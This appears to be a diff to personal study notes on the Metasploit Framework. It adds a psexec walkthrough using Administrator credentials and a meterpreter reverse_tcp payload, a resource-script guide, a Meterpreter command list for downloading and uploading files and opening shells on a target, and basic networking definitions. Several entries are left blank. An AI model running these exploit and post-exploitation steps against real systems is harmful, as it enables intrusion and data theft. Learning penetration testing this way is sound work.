@@ -1,6 +1,6 @@
 [TOC]
 
-# Metasploit Framework
+# Metasploit
 
 Open-source penetration-testing framework written using the Ruby language.
 
@@ -67,6 +67,41 @@ To be filled ...
 
 To be filled ...
 
+## Resource Scripts
+
+Resource scripts provide an easy way to automate repetitive tasks in Metasploit. The Metasploit Framework comes pre-installed with several community-written scripts located at */usr/share/metasploit-framework/scripts/resources/\*.rc*
+
+### Creating a resource script
+
+A resource script can be made by executing a module and then using the `makerc`command in *msfconsole* to create a resource file with the commands executed since startup to a .rc file.
+
+1. Execute a module
+
+   ```
+   msf > use exploit/windows/smb/psexec
+   msf exploit (psexec) > set RHOST 10.10.10.1
+   msf exploit (psexec) > set SMBUSER Administrator
+   msf exploit (psexec) > set SMBPASS password
+   msf exploit (psexec) > set PAYLOAD windows/meterpreter/reverse_tcp
+   msf exploit (psexec) > set LHOST 127.0.0.1
+   msf exploit (psexec) > exploit
+   msf exploit (psexec) > ^Z (to background the session)
+   ```
+
+2. Use the `makerc`command to create a .rc file
+
+   ```
+   msf exploit (psexec) > makerc /root/my_psexec.rc
+   ```
+
+### Using a resource script
+
+The run a resource script when launching *msfconsole*, use the **-r** flag followed by the path to the resource script
+
+```
+~# msfconsole -r /root/my_psexec.rc
+```
+
 
 
 # 2. Information Gathering
@@ -125,7 +160,69 @@ We will use the Windows Registry Only Persistence local exploit module to create
 
 
 
+# 4. Meterpreter
 
+Meterpreter is a command interpreter for Metasploit that acts as a payload. It works by using in-memory DLL injections and a native shared object format in context with the exploited process, which means it does not create any new process and allows for a more stealthy and powerful payload. In addition to working in-memory and not writing to the target's disk at all, Meterpreter uses encrypted communication channels,over TLS using a TLV protocol, with the target.
+
+## Advantages over specific payloads
+
+* Works in context with the exploited process, so it doesn't create a new process
+* Migrate easily among processes
+* Resides completely in memory, so it writes nothing to disk
+* Uses encrypted channels
+* Uses a channelized communication system so users can work with several channels at a time
+* Provides a platform to write extensions quickly and easily
+
+## Useful commands
+
+The following commands are all within the `meterpreter > <command> `context. Some commands, such as edit, are available through the `msf >` context as well. 
+
+### System commands
+
+* `background` : Background the current session
+* `getuid` : Return the current username of the target machine
+* `getpid` : Return the process ID in which Meterpreter is currently running
+* `ps`: List all the running processes on the target machine
+* `sysinfo` : List the target system's information, such as OS, architecture, etc.
+* `shell` : Provide a shell prompt for the target's machine
+* `exit` : Terminate a Meterpreter session
+* `?` : List all available Meterpreter commands
+
+### Filesystem commands
+
+Commands for exploring the target system and performing various tasks such as: searching for files, downloading files, and changing the directory.
+
+* `pwd` Return the present working directory
+* `cd <location>` : Change working directory to location
+* `ls`: List files in the current directory
+* `search` : Search for specific files and file types
+  * Ex: `search -f *.doc -d c:\`will search for all files in the C: drive with a .doc file extension
+    * **-f** to specify the file pattern to search for
+    * **-d** to specify which directory to perform a recursive search
+* `download` : Download a file from the target's machine
+  * Ex: `download C:\\Users\\Public\\Desktop\\secrets.docx`
+    * Note the required double slashes when specifying a Windows path
+* `upload` :  Upload any file to the target's machine
+  * Ex: `upload file.exe`
+* `rm` : Remove a file or directory from the target's machine
+  * Ex: `rm file.exe`
+* `edit` : Edit files on the target's machine using the `vim` editor
+  * Ex: `edit root.txt`
+* `show_mount` : List all mount points/logical drives
+* `help File system commands` : List all file system commands
+
+### Networking commands
+
+Commands for understanding the network structure of the target's system, such as: analyzing whether the system belongs to a LAN or if it's a standalone system, determining the IP range, DNS information, etc. 
+
+* `arp` : Display the host ARP cache
+* `getproxy`: Display the current proxy configuration
+* `ipconfig/ifconfig` : Display network interfaces and IP configurations
+* `netstat` : Display network connections
+* `portfwd` :  Forward incoming TCP/UDP connections to remote hosts
+  * Ex:
+* `route` : 
+* `help networking` : List all networking commands
 
 ------
 
@@ -155,10 +252,27 @@ A stager will set up a network connection between the attacker and victim, and i
 
 Stages are payload components downloaded by the stager that provide advanced features with no size limits, such as *dllinject*, *meterpreter*, *upexec*, *vncinject*, etc.
 
+## Networking
+
+### Subnetwork or Subnet
+
+The concept of dividing a large network into smaller, identifiable parts. Subnetting is done to increase the address utility and security.
+
+### Netmask
+
+A 32-bit mask used to divide an IP address into subnets and specify the network's available hosts.
+
+### Gateway
+
+Specifies the forwarding, or the next hop, IP address over which the set of addresses defined by the network are reachable.
+
 ------
 
 # Appendix
 
 * msf : Metasploit Framework
-* xml : 
+* XML : 
 * nmap : 
+* TLS :
+* TLV :
+* vim : 
